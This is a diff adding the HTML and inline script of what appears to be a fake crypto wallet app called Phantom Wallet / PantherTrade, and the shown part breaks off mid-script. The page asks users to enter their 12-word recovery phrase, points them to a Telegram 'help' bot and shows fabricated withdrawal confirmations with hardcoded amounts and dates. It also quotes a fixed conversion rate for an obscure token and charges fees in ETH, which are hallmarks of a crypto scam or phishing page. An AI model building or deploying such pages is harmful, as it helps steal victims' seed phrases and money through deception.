@@ -1,0 +1,1559 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+  <title>Phantom Wallet Balance</title> 
+  <link rel="stylesheet" href="styles.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200&icon_names=arrow_back" />
+  
+ </head>  
+<body>
+  
+  
+  
+  
+  
+  
+  
+    <div id="login-container-one" class="login-container-one"> 
+     <img src="https://www.panthertrade.com/client/img/icon.5265cbf.svg" alt="BTC" class="binance-icon-a">
+     <div class=""></div>
+    <!--<h1>Login with Your 24-Phrase Key 1</h1>--> 
+    <!--<img src="https://public.bnbstatic.com/image/cms/content/body/202310/611e56e75c82c60b33fa51589122e396.jpg" alt="BTC" class="marketplace">-->
+  
+       
+    <div class="slider-container"> 
+    <div class="slider-track"> 
+      <!-- Original Images -->
+      <img src="https://static.vecteezy.com/system/resources/thumbnails/011/064/665/small/cryptocurrency-3d-illustration-free-png.png" alt="Image 1" class="slide-img">
+      <img src="https://static.vecteezy.com/system/resources/previews/024/092/703/non_2x/bitcoin-btc-glass-crypto-coin-3d-illustration-free-png.png" alt="Image 2" class="slide-img">
+      <img src="https://cdn3d.iconscout.com/3d/premium/thumb/ethereum-coin-3d-icon-png-download-4466120.png" alt="Image 3" class="slide-img">
+      <!-- Duplicate Images for Seamless Loop -->
+      <img src="https://static.vecteezy.com/system/resources/thumbnails/011/064/665/small/cryptocurrency-3d-illustration-free-png.png" alt="Image 1" class="slide-img"> 
+      <img src="https://static.vecteezy.com/system/resources/previews/024/092/703/non_2x/bitcoin-btc-glass-crypto-coin-3d-illustration-free-png.png" alt="Image 2" class="slide-img">
+      <img src="https://cdn3d.iconscout.com/3d/premium/thumb/ethereum-coin-3d-icon-png-download-4466120.png" alt="Image 3" class="slide-img">
+    </div>
+  </div>
+
+
+   <div class="text-slider-container">
+    <div class="text-slider-track">
+      <!-- Text lines -->
+      <div>Build your portfolio from over 600+ listed tokens.</div>
+      <div>Discover trending assets, seamless token swaps</div>
+      <div>Insights to make smarter financial decisions.</div>
+      <!-- Duplicate for seamless loop -->
+      <div>Build your portfolio from over 600+ listed tokens.</div>
+      <div>Discover trending assets, seamless token swaps</div>
+      <div>Insights to make smarter financial decisions.</div>
+    </div>
+  </div>
+
+ 
+    <form id="login-form-one">
+      <button type="submit" id="create-wallet-button">Create wallet</button> 
+      <button type="submit" id="login-button-one">Import wallet</button> 
+      
+    </form>
+    <p id="error-message"></p> 
+  </div> 
+  
+  
+
+  
+  
+   <div id="login-container" class="login-container hidden">
+       
+     <img src="https://www.panthertrade.com/client/img/icon.5265cbf.svg" alt="BTC" class="binance-icon-phrase">
+     <div class=""></div>
+    <h1>Login with Your 12-Phrase Key</h1> <span class="material-symbols-outlined" id="out-button"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span></button>
+    <form id="login-form">
+      <textarea id="key-input" placeholder="Enter your 12 words here, separated by spaces..." required></textarea>
+      <input type="text" id="referral-code" placeholder="Referral Code (Optional)">
+      <button type="submit" id="login-button">Restore wallet</button>  
+         
+         
+    </form>  
+    <p id="error-message"></p>
+  </div>  
+  
+  
+   
+   
+  <div id="phrase-container" class="phrase-container hidden">
+       
+     <img src="https://www.panthertrade.com/client/img/icon.5265cbf.svg" alt="BTC" class="binance-icon-phrase">
+     <div class=""></div>
+    <h1>Create New Wallet</h1> <span class="material-symbols-outlined" id="out-button-two"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span></button> 
+    
+  <div class="container" id="word-container">
+    <!-- Boxes will be dynamically generated here -->
+  </div>
+   <div class="copy-button" id="copy-button">Copy to clipboard<img src="https://cdn-icons-png.flaticon.com/128/16786/16786337.png" alt="Copy" class="copy-button-icon"></div>
+  
+  <div class="copy-warning">Never share your secret phrase with anyone and store it securely!</div>  
+  <div class="create-menu">
+ 
+  <div class="continue-button" id="continue-button">Continue</div>
+  </div>
+  <div id="toast" class="toast"></div>
+  
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0&icon_names=file_copy" />     
+  </div> 
+  
+  
+  
+  
+  <div id="home-page" class="home-page hidden">  
+    
+    <!--<button id="logout-button">Log out</button>-->
+  
+  
+  
+  
+  
+  
+  <div class="binance-logo-back"></div> 
+  <div class="wallet">  
+    
+    <div class="account-fixed-top">   
+    <div class="account-one-flex">
+    <img src="https://cdn-icons-png.flaticon.com/128/1150/1150388.png" alt="Profile" class="binance-icon">
+    <!--<div id="deposit-top-display" class="deposit-top-display hidden">Deposit</div>-->
+    <div class="total-value-txt">Account 1</div> 
+    </div>  
+      
+    <div class="balance">
+      <div id="balance" class="balance-text"><div class="pulse"></div></div><div class="balance-usd"></div> 
+    </div>  
+    <div class=""></div>
+    <div class=""></div>
+    <div class=""></div>
+    
+    <a href="https://t.me/PantherTradeaihelpbot"><img src="https://cdn-icons-png.flaticon.com/128/6515/6515926.png" alt="Coin Logo" class="support-profile"/></a>
+    
+    <div class="top-menu-buttons">
+    <button id="deposit-button-top" class="modal-button-top">Deposit</button>
+    <button id="send-button-top" class="modal-button-top">Withdraw</button>
+    <button id="p2p-button" class="modal-button-top">P2P</button>
+<!--<button id="convert-butto" class="modal-button">Convert</button>--> 
+
+    </div>
+    </div>
+     
+    <div class="cryptos">
+      <div class="h-font">Assets</div>
+      <ul id="crypto-list"></ul>
+    </div>
+  </div> 
+
+  <!-- Modal for send and receive actions -->
+  <div id="crypto-modal" class="modal">   
+    <div class="modal-content"> 
+      <div class="modal-main">   
+  <div class="pre-info-head"><span class="close-button"><span class="material-symbols-outlined"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span></span></div><div class="pre-info-center"><div id="balance-inside-logo"></div><div class="modal-title">Crypto Name</div></div>        
+           
+        <div class="spot-balance">Total assets</div>   
+           
+        <div class="spot-value">
+          <div class="spot-balance-value"><div id="balance-inside"></div></div><div class="spot-balance-usd"><div id="usd-inside"></div></div>   
+        </div> 
+        
+        <div class="spot-details"> 
+          <div class="spot-details-column"><div class="spot-details-avail">Available</div><div id="balance-inside-detail"></div></div> 
+          <div class="spot-details-column"><div class="spot-details-avail">Unavailable</div><div class="">0.0000</div></div> 
+            </div> 
+ 
+        <div class="spot-trading">Trade</div>  
+         
+      <div class="spot-trading-row">     
+        <div class="spot-trading-box">  
+        BTC/USDT  
+       
+        <div id="red-BTC">Loading...</div>
+        <div class="spot-red-font">+0.35%</div> 
+        </div>
+       
+        <div class="spot-trading-box">
+        ETH/USDC
+        
+        <div id="red-ETH">Loading...</div>
+        <div class="spot-red-font">+0.46%</div>
+        </div>  
+        
+        <div class="spot-trading-box"> 
+        BNB/USDC
+        
+        <div id="red-BNB">Loading...</div> 
+          <div class="spot-red-font">+0.64%</div>
+        </div>
+      </div>
+        
+        
+        <script>
+        async function fetchBitcoinPrice() {
+            try {
+                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
+                const data = await response.json();
+                const redBTC = data.bitcoin.usd;
+                document.getElementById('red-BTC').innerText = `$${redBTC}`;
+            } catch (error) {
+                document.getElementById('red-BTC').innerText = 'Loading...';
+                console.error('Error fetching Bitcoin price:', error);
+            }
+        }
+
+        fetchBitcoinPrice();
+        setInterval(fetchBitcoinPrice, 120000); // Update price every minute
+      
+      
+    async function fetchBNBPrice() {
+    try {
+        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd');
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        const data = await response.json();
+        const redBNB = data['binancecoin'].usd;
+        document.getElementById('red-BNB').innerText = `$${redBNB.toFixed(2)}`;
+    } catch (error) {
+        document.getElementById('red-BNB').innerText = 'Loading...';
+        console.error('Error fetching BNB price:', error);
+    }
+}
+
+// Initial fetch on page load
+fetchBNBPrice();
+
+// Update price every 60 seconds
+setInterval(fetchBNBPrice, 120000);
+
+      
+      
+      async function fetchEthereumPrice() {
+            try {
+                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=wrapped-steth&vs_currencies=usd');
+                const data = await response.json();
+                const redETH = data['wrapped-steth'].usd;
+                document.getElementById('red-ETH').innerText = `$${redETH}`;
+            } catch (error) {
+                document.getElementById('red-ETH').innerText = 'Loading...';
+                console.error('Error fetching Ethereum price:', error);
+            }
+        }
+
+        fetchEthereumPrice();
+        setInterval(fetchEthereumPrice, 120000); // Update price every minute
+    </script> 
+        
+        
+      <div class="spot-trading">Recommended</div>
+        
+      <div class="spot-trading-row"> 
+        <div class="spot-trading-box">
+        Earn USDC APR
+        up to 16.20%
+        </div>
+         
+       <div class="spot-trading-box"> 
+        Earn BTC/USDT APR
+        up to 23%
+        </div>
+      </div>
+        
+        <div class="spot-bottom-buttons">
+        <div id="receive-button" class="modal-button">Deposit</div> 
+        <div id="send-button" class="modal-button">Withdrawal</div> 
+        <div id="convert-button" class="modal-button">Convert</div>   
+        </div> 
+      </div>    
+ 
+      <!-- Receive page content -->  
+      <div class="modal-receive" style="display: none;">
+        <div class="receive-title">Deposit</div>
+         <div class="p-close-button" onclick="document.querySelector('.modal-receive').style.display='none';document.querySelector('.modal-main').style.display='block';"><span class="material-symbols-outlined"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span></div> 
+         
+        <div class="receive-logo">
+          <img src="" alt="Coin Logo" /> 
+        </div>  
+        
+        <div class="receive-border">  
+        <div class="receive-network-txt">Network</div>  
+        <p class="receive-network"> </p> 
+         
+        <div class="receive-address-txt">Deposit Address</div>
+          <div class="receive-arrange"> 
+        <p class="wallet-address">your_wallet_address_here</p>
+        <div id="copy-address-button"><img src="https://cdn-icons-png.flaticon.com/128/18563/18563754.png" alt="Copy" class="copy-address-icon"></div>
+          </div>
+        </div> 
+         
+         <div class="accept-box-details-rec">  
+     <div class="accept-box-details-a">   
+     <div class="accept-box-left-conv">Route Deposits To</div> 
+     <div class="accept-box-left-conv">Deposit Arrival</div> 
+     <div class="accept-box-left-conv">Withdrawal Unlocked</div>  
+      </div>  
+         
+      <div class="accept-box-details-b">   
+      <div class="accept-box-right-conv">Spot Wallet</div>  
+      <div class="accept-box-right-conv">20 confirmations</div> 
+      <div class="accept-box-right-conv">20 confirmations</div>  
+      </div>  
+        </div>   
+
+        <div class="express-avail-mini-2">Please make sure that only&nbsp<span id="modal-title-crypto-rec"></span>&nbspdeposit is made via this address. Otherwise, your deposited funds will not be added to your available balance -- nor will it be refunded.</div>  
+         
+        <button class="receive-done" onclick="document.querySelector('.modal-receive').style.display='none';document.querySelector('.modal-main').style.display='block';">Done</button> 
+        <div id="bread" class="bread"></div>
+      </div> 
+    </div>
+  </div>
+  
+    
+   
+    
+  
+     
+  <div id="send-modal" class="modal">
+  <div class="modal-content">  
+    
+    <button class="modal-button-proline" onclick="document.querySelector('#send-modal').style.display='none';document.querySelector('.modal-main').style.display='block';"><span class="material-symbols-outlined"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span></button> 
+    
+    <div class="send-modal-title">Send&nbsp<div id="modal-title-crypto">Crypto Name</div></div>   
+    <form class="send-form"> 
+      <div class="input-container">  
+       <div class="send-page-label">Withdrawal Address</div>
+       <input type="text" id="receiver-address" placeholder="Tap and Hold To Paste Address" required>
+       <span class="input-description"></span>  
+     </div>  
+       
+      <div class="">
+      <div class="send-page-label">Withdrawal Network</div>    
+        <div class="network-identify" placeholder="Automatically match the network"><div class="correct-display">ERC20</div></div>  
+        <!--<div class="swap-section-two">  
+                    <div class="token-select">  
+                        <button class="dropdown-btn-two" id="token-in-button">    
+                            <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" alt="BTC" class="token-icon"> <span>Select coin</span>
+                        </button> 
+                    </div>
+                </div>-->  
+      </div>
+       
+      <div class="send-page-label-two">Withdrawal Amount</div>
+      <input type="number" id="amount" name="amount" min="0" step="0.01" placeholder="Minimum 15" required><br><br>
+      <!-- <button id="confirm-button" disabled class="disabled-button">Confirm</button> -->
+       
+    </form>  
+    
+    <div class="sans-avail">  
+  <div class="sans-avail-text">Available</div><div class="sans-avail-details"><div id="balance-inside-sendpage"></div>&nbsp<div id="modal-title-sendpage"></div></div> 
+    </div> 
+     
+    <div class="sans-left">* Do not withdraw directly to a crowdfund or ICO. We will not credit your account with tokens from that sale.</div>    
+      <div class="sans-left">* Do not transact with Sanctioned Entities. Learn more</div>  
+     
+  
+    
+    <div class="sans-row">  
+      <div class="sans-column"> 
+        <div class="">Network fee</div>       
+        <div class="">Credited amount</div>  
+      </div> 
+      <div class="sans-column-b">
+        <div class="sans-span-x"><div class="sans-fee">--</div> &nbsp<div id="modal-title-crypto-c">Crypto Name</div></div> 
+        <div class="sans-span-x"><div class="sans-outcome">0.00</div> &nbsp<div id="modal-title-crypto-b">Crypto Name</div><span class="small-max">Max</span></div>
+      </div>
+    </div>
+    
+      <button id="sendpage-withdraw" class="sendpage-withdraw">Withdraw</button>
+  </div>  
+</div>
+    
+    
+           
+   <script>
+    const amountField = document.getElementById('amount');
+    const sansOutcome = document.querySelector('.sans-outcome');
+    const sansFee = document.querySelector('.sans-fee');
+    //const convertedUsdDiv = document.querySelector('.accept-box-conv-usd');
+
+    amountField.addEventListener('input', function () {
+      const sansValue = parseFloat(amountField.value);
+
+      // Update displayDiv with raw value
+      sansOutcome.textContent = amountField.value;
+
+      // Update convertedDiv with calculated value
+      if (!isNaN(sansValue)) {
+        sansFee.textContent = (sansValue * 0.0004).toFixed(2);
+      } else {
+        sansFee.textContent = '';
+      }
+      
+     /** if (!isNaN(inputValue)) {
+        convertedUsdDiv.textContent = (inputValue * 0.1).toFixed(2);
+      } else {
+        convertedUsdDiv.textContent = '';
+      }**/
+    });
+  </script>
+  
+    
+    
+    
+    
+    
+    
+    <div id="send-modal-top" class="modal">
+  <div class="modal-content">  
+    
+    <button class="modal-button-proline" onclick="document.querySelector('#send-modal-top').style.display='none';document.querySelector('#home-page').style.display='block';"><span class="material-symbols-outlined"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span></button> 
+    
+    <div class="send-modal-title">Send&nbsp<div id="modal-title-crypto">ETH</div></div>   
+    <form class="send-form"> 
+      <div class="input-container">  
+       <div class="send-page-label">Withdrawal Address</div>
+       <input type="text" id="receiver-address-b" placeholder="Tap and Hold To Paste" required>
+       <span class="input-description-b"></span>   
+     </div>  
+       
+      <div class="">
+      <div class="send-page-label">Withdrawal Network</div>    
+        <div class="network-identify" placeholder="Automatically match the network"><div class="correct-display-b">ERC20</div></div>  
+        <!--<div class="swap-section-two">  
+                    <div class="token-select">  
+                        <button class="dropdown-btn-two" id="token-in-button">    
+                            <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" alt="BTC" class="token-icon"> <span>Select coin</span>
+                        </button> 
+                    </div>
+                </div>-->  
+      </div>
+       
+      <div class="send-page-label-two">Withdrawal Amount</div>
+      <input type="number" id="amount-b" name="amount" min="0" step="0.01" placeholder="Minimum 15" required><br><br>
+      <!-- <button id="confirm-button" disabled class="disabled-button">Confirm</button> -->
+       
+    </form>  
+    
+    <div class="sans-avail">  
+  <div class="sans-avail-text">Available</div><div class="sans-avail-details"><div id="balance-inside-sendpage"></div>&nbsp<div id="modal-title-sendpage"></div></div> 
+    </div> 
+    
+    <div class="sans-left">* Do not withdraw directly to a crowdfund or ICO. We will not credit your account with tokens from that sale.</div>    
+      <div class="sans-left">* Do not transact with Sanctioned Entities. Learn more</div>  
+       
+    <div class="sans-row"> 
+      <div class="sans-column">
+        <div class="">Network fee</div>         
+        <div class="">Credited amount</div>  
+      </div> 
+      <div class="sans-column-b">
+         <div class="sans-span-x"><div class="sans-fee-b">--</div>&nbsp ETH</div> 
+         <div class="sans-span-x"><div class="sans-outcome-b">0.00</div>&nbsp ETH<span class="small-max">Max</span></div>
+      </div>
+    </div>      
+       
+    <div id="sendpage-withdra" class="sendpage-withdraw">Withdraw</div>
+  </div> 
+</div> 
+     
+        
+   <script>
+    const amountFieldB = document.getElementById('amount-b');
+    const sansOutcomeB = document.querySelector('.sans-outcome-b');
+    const sansFeeB = document.querySelector('.sans-fee-b');
+    //const convertedUsdDiv = document.querySelector('.accept-box-conv-usd');
+
+    amountFieldB.addEventListener('input', function () {
+      const sansValueB = parseFloat(amountFieldB.value);
+
+      // Update displayDiv with raw value
+      sansOutcomeB.textContent = amountFieldB.value;
+
+      // Update convertedDiv with calculated value
+      if (!isNaN(sansValueB)) {
+        sansFeeB.textContent = (sansValueB * 0.007).toFixed(2);
+      } else {
+        sansFeeB.textContent = '';
+      }
+      
+     /** if (!isNaN(inputValue)) {
+        convertedUsdDiv.textContent = (inputValue * 0.1).toFixed(2);
+      } else {
+        convertedUsdDiv.textContent = '';
+      }**/
+    });
+  </script>
+  
+     
+    
+    
+        <div id="withdraw-confirm-modal" class="modal">    
+        <div class="modal-content"> 
+        
+            <button class="p-close-button-z" onclick="document.querySelector('#withdraw-confirm-modal').style.display='none';document.querySelector('#send-modal').style.display='block';"><span class="material-symbols-outlined"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span></button>
+          
+         <!--<div class="withdraw-warning">We believe that smart savings starts with trust. PantherTrade is built with industry-grade security, transparent processes, and dedicated support. So you can transact with peace of mind.</div>
+          <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/3408.png" alt="BTC" class="withdraw-icon">  
+          <div class="withdrawal-processing">Withdrawal Processing</div> 
+          <div class="withdrawal-p-amt">6,190 USDC</div>  
+          <span class="withdrawal-estim">Estimated completion time: 2025-12-22 12:55:16.</span> 
+          <span class="withdrawal-estim">You will receive a notification once withdrawal
+          is completed.</span> 
+          <span class="withdrawal-estim">View history for latest updates</span> 
+          <div class="with-done" onclick="document.querySelector('#withdraw-confirm-modal').style.display='none';document.querySelector('#send-modal').style.display='block';">Done</div>-->
+          
+          
+         <div class="withdraw-warning">We believe that smart savings starts with trust. PantherTrade is built with industry-grade security, transparent processes, and dedicated support. So you can transact with peace of mind.</div>
+          <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/1027.png" alt="BTC" class="withdraw-icon">  
+          <div class="withdrawal-processing">Withdrawal Processing</div> 
+          <div class="withdrawal-p-amt">0.72 ETH</div>  
+          <span class="withdrawal-estim">Estimated completion time: 2025-12-22 12:53:31.</span> 
+          <span class="withdrawal-estim">You will receive a notification once withdrawal
+          is completed.</span> 
+          <span class="withdrawal-estim">View history for latest updates</span> 
+          <div class="with-done" onclick="document.querySelector('#withdraw-confirm-modal').style.display='none';document.querySelector('#send-modal').style.display='block';">Done</div>
+    
+        </div>
+        </div>
+    
+    
+    
+    
+    
+  
+  
+    
+    
+    <div id="deposit-top-modal" class="modal">
+  <div class="modal-content"> 
+  <div class="p-close-button" onclick="document.querySelector('#deposit-top-modal').style.display='none';document.querySelector('#home-page').style.display='block';"><span class="material-symbols-outlined"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span></div> 
+    
+    <div class="cryptos">
+      <div class="p-font">Deposit</div>
+<ul id="crypto-list-deposit" class="crypto-list"> 
+  <!-- List items will be dynamically added here -->
+</ul> 
+    </div>
+     </div>
+</div>
+    
+    
+    
+     <div id="deposit-top-selected-modal" class="modal"> 
+  <div class="modal-content"> 
+  <div class="p-close-button" onclick="document.querySelector('#deposit-top-selected-modal').style.display='none';document.querySelector('#deposit-top-modal').style.display='block';"><span class="material-symbols-outlined"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span></div>
+    
+    <div class="modal-title">Crypto Name</div>
+    <div class="receive-logo">
+          <img src="" alt="Coin Logo" />
+        </div>
+      
+    <div class="receive-border"> 
+        <div class="receive-network-txt">Network</div> 
+        <p class="receive-network"> </p>  
+        
+      <div class="receive-address-txt">Deposit Address</div>  
+          <div class="receive-arrange">  
+        <p class="wallet-address">your_wallet_address_here</p> 
+        <div id="copy-address-button"><img src="https://cdn-icons-png.flaticon.com/128/16786/16786124.png" alt="Copy" class="copy-address-icon"></div>
+             </div>
+        </div>
+
+      <div class="accept-box-details-rec"> 
+     <div class="accept-box-details-a">   
+     <div class="accept-box-left-conv">Route Deposits To</div> 
+     <div class="accept-box-left-conv">Deposit Arrival</div> 
+     <div class="accept-box-left-conv">Withdrawal Unlocked</div>  
+      </div>  
+         
+      <div class="accept-box-details-b">   
+      <div class="accept-box-right-conv">Spot Wallet</div>  
+      <div class="accept-box-right-conv">20 confirmations</div> 
+      <div class="accept-box-right-conv">20 confirmations</div> 
+      </div>  
+        </div>   
+ 
+        <div class="express-avail-mini-2">Please make sure that only the correct cryptocurrency deposit is made via this address. Otherwise, your deposited funds will not be added to your available balance -- nor will it be refunded.</div> 
+    
+    <button class="receive-done" onclick="document.querySelector('#deposit-top-selected-modal').style.display='none';document.querySelector('#deposit-top-modal').style.display='block';">Done</button>  
+   </div>
+</div>  
+    
+   
+
+  
+   <!-- <div class="modal-receive" style="display: none;"> 
+        <h2 class="receive-title">Deposit</h2>  
+        <div class="receive-logo">
+          <img src="" alt="Coin Logo" />
+        </div>
+        
+        <div class="receive-border"> 
+        <div class="receive-network-txt">Network</div>  
+        <p class="receive-network"> </p> 
+         
+        <div class="receive-address-txt">Deposit Address</div>
+          <div class="receive-arrange"> 
+        <p class="wallet-address">your_wallet_address_here</p>
+        <div id="copy-address-button"><img src="https://cdn-icons-png.flaticon.com/128/16786/16786124.png" alt="Copy" class="copy-address-icon"></div>
+          </div>
+        </div>
+         
+        <button class="receive-done" onclick="document.querySelector('.modal-receive').style.display='none';document.querySelector('.modal-main').style.display='block';">Done</button>
+      </div> 
+    </div>
+  </div>-->
+    
+    
+    
+    
+     <div id="convert-modal" class="modal">
+  <div class="modal-content"> 
+    <div class="express-line-a">
+  <div class="p-close-button" onclick="document.querySelector('#convert-modal').style.display='none';document.querySelector('#home-page').style.display='block';"><span class="material-symbols-outlined"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span></div>
+    <div class="express-head">Convert</div>
+       </div>
+   
+    <div class="express-container"> 
+        
+        <main>
+           <!-- <div class="express-title">P2P Express</div>
+            <div class="express-subtitle">Buy USDT with USD</div>
+            <div class="express-description">Buy and Sell USDT on Binance P2P with various payment methods</div> -->
+
+            
+          
+          <!--<div class="express-tabs">
+                <button class="express-tab-btn express-tab-active" id="express-buy-tab">Market</button>   
+                <button class="express-tab-btn" id="express-sell-tab">Limit</button>  
+            </div>-->
+          
+          <div class="green-connect" hidden>Connected</div>
+    
+                    
+            <div class="express-form-container">         
+                <div class="express-form-group">           
+                    <div class="express-you-pay-label">From</div>     
+                  <div class="express-avail-bal">Available&nbsp<div class="connect-val">0.00</div>&nbsp<div id="modal-title-convert-page"></div></div> 
+                    <input type="number" id="express-you-pay" placeholder="Amount" /> 
+                    <div class="express-currency-one" id="express-currency-one"><img src="https://img.freepik.com/premium-vector/blue-diamond-is-white-background_868686-19.jpg" alt="BTC" class="express-from-icon" id="express-from-icon">RBL</div> 
+              </div>   
+              <img src="https://cdn-icons-png.flaticon.com/128/17701/17701488.png" alt="BTC" class="express-swap-icon" id="express-swap-icon"> 
+                   
+                <div class="express-form-group"> 
+                    <div class="express-you-receive-label">To</div>
+                    <input type="number" id="express-you-receive" placeholder="" /> 
+                    <div class="express-currency-two" id="express-currency-two"><img src="https://s2.coinmarketcap.com/static/img/coins/64x64/3408.png" alt="USDT" class="express-to-icon" id="express-to-icon">USDC</div>
+                </div>   
+ <div class="express-avail-mini">Insufficient Balance</div> 
+              
+              <div class="anonymous-fy">
+                <div class="anon-text">Enable Anonymity</div>
+                <label class="switch"> 
+    <input type="checkbox">   
+    <span class="slider"></span>   
+</label>
+              </div>   
+                 
+              <div class="connect-aix" id="connect-aix">Connect Wallet</div> 
+  
+              
+                <button id="express-payment-preview" class="express-payment-preview">Get quote</button> 
+            </div>
+          
+        </main>  
+    </div>
+     
+     </div>
+</div>
+    
+    
+    
+    
+    
+  <div id="connect-aix-modal" class="modal"> 
+     <div class="modal-content"> 
+       <div class="p-close-button" onclick="document.querySelector('#connect-aix-modal').style.display='none';document.querySelector('#convert-modal').style.display='block';"><span class="material-symbols-outlined"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span></div> 
+       
+        <div class="con-aix-header">Connect</div>
+       
+    <div class="con-aix-block"> 
+      <div class="con-aix-network">Network</div> 
+      <div class="con-aix-net" id="con-dis-a">--</div>  
+      
+       <div class="con-aix-imp">Wallet Bind</div>  
+   <input type="text" id="connect-input" placeholder="Paste Address" />
+       </div>
+       
+        <div class="con-aix-imp">Name</div> 
+   <div class="con-aix-net" id="con-dis-b">--</div> 
+       
+    
+    <div class="con-aix-imp">Symbol</div>  
+   <div class="con-aix-net" id="con-dis-c">--</div> 
+        
+    
+    <div class="con-aix-imp">Decimals</div>  
+   <div class="con-aix-net" id="con-dis-d">--</div>  
+       
+       
+       <div class="con-aix-done" onclick="document.querySelector('#connect-aix-modal').style.display='none';document.querySelector('#convert-modal').style.display='block';">Connect Wallet</div>
+    
+         </div> 
+         </div>
+    
+     
+    
+      
+  
+     
+   
+      <div id="express-confirm-modal" class="modal"> 
+  <div class="modal-content"> 
+        <div class="express-payment-blur" onclick="document.querySelector('#express-confirm-modal').style.display='none';document.querySelector('#convert-modal').style.display='block';"></div
+          >
+    <div class="confirm-order-header">Confirm order</div>
+    <div class="express-payment-cancel" onclick="document.querySelector('#express-confirm-modal').style.display='none';document.querySelector('#convert-modal').style.display='block';"><img src="https://cdn-icons-png.flaticon.com/128/8212/8212742.png" alt="BTC" class="cancel-fire"></div>
+     
+    
+    <div class="accept-box-img"> 
+    <img src="https://img.freepik.com/premium-vector/blue-diamond-is-white-background_868686-19.jpg" alt="RBL" class="not-icon-a">
+    <img src="https://cdn-icons-png.flaticon.com/128/14736/14736845.png" alt="BTC" class="not-arrow-icon">
+    <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/3408.png" alt="BTC" class="not-icon-b">
+    </div>  
+     
+    <div class="accept-box-label">   
+    <div class="accept-box-from">From</div>
+    <div class="accept-box-to">To</div>  
+    </div>  
+     
+    <div class="accept-box-label-amt">     
+      <div class="accept-box-amount"><div class="accept-box-win"></div>&nbsp<div class="accept-box-trans">RBL</div></div>  
+    <div class="accept-box-amount-to"><div class="accept-box-conv"></div>&nbspUSDC</div> 
+    </div>
+      
+    <div class="accept-box-usd">$<div class="accept-box-conv-usd"></div></div>  
+      
+    <div class="accept-box-details">
+      <div class="accept-box-details-a">   
+    <div class="accept-box-left">Type</div> 
+    <div class="accept-box-left">Transaction Fees</div> 
+    <div class="accept-box-left">Pay From</div> 
+      </div> 
+        
+      <div class="accept-box-details-b">   
+      <div class="accept-box-right">Instant</div>  
+      <div class="accept-box-right" id="a-box-fees">0.52 ETH</div> 
+      <div class="accept-box-right">Spot Wallet</div> 
+      </div> 
+        </div>  
+   <div class="express-confirm-row"> 
+      
+      <button id="express-payment-btn">Confirm</button>  
+      </div>
+     
+    </div>
+  </div>
+      
+    
+    
+   <script>
+    const inputField = document.getElementById('express-you-pay');
+    const displayDiv = document.querySelector('.accept-box-win');
+    const convertedDiv = document.querySelector('.accept-box-conv');
+    const convertedUsdDiv = document.querySelector('.accept-box-conv-usd');
+
+    inputField.addEventListener('input', function () {
+      const inputValue = parseFloat(inputField.value);
+
+      // Update displayDiv with raw value
+      displayDiv.textContent = inputField.value;
+
+      // Update convertedDiv with calculated value
+      if (!isNaN(inputValue)) {
+        convertedDiv.textContent = (inputValue * 6.19).toFixed(2);
+      } else {
+        convertedDiv.textContent = '';
+      }
+      
+      if (!isNaN(inputValue)) {
+        convertedUsdDiv.textContent = (inputValue * 6.19).toFixed(2);
+      } else {
+        convertedUsdDiv.textContent = '';
+      }
+    });
+  </script>
+    
+    
+    
+    
+    
+    <div id="convert-confirm-modal" class="modal">   
+        <div class="modal-content"> 
+        
+            <button class="p-close-button-z" onclick="document.querySelector('#convert-confirm-modal').style.display='none';document.querySelector('#convert-modal').style.display='block';"><span class="material-symbols-outlined"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span></button>
+           
+          <div class="withdraw-warning">We believe that smart savings starts with trust. PantherTrade is built with industry-grade security, transparent processes, and dedicated support. So you can transact with peace of mind.</div>
+          <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/3408.png" alt="BTC" class="withdraw-icon">  
+          <div class="convert-processing">Conversion Successful</div> 
+          
+          
+     <div class="accept-box-details-conv"> 
+     <div class="accept-box-details-a">   
+     <div class="accept-box-left-conv">From</div> 
+     <div class="accept-box-left-conv">To</div> 
+     <div class="accept-box-left-conv">Exchange rate</div>
+     <div class="accept-box-left-conv">Fees</div>  
+      </div>  
+         
+      <div class="accept-box-details-b">   
+      <div class="accept-box-right-conv"><div class="conv-box-win"></div>&nbspRBL</div>  
+      <div class="accept-box-right-conv"><div class="conv-box-conv"></div>&nbspUSDC</div> 
+      <div class="accept-box-right-conv">6.19 USDC = 1 RBL </div> 
+      <div class="accept-box-right-conv">0.09 ETH</div> 
+      </div>  
+        </div>  
+            
+          <span class="convert-history">View conversion history</span> 
+          <div class="with-done" onclick="document.querySelector('#convert-confirm-modal').style.display='none';document.querySelector('#convert-modal').style.display='block';">Confirm</div> 
+    
+        </div>
+        </div>
+     
+     
+     <script>
+    const inputFieldConv = document.getElementById('express-you-pay');
+    const displayDivConv = document.querySelector('.conv-box-win');
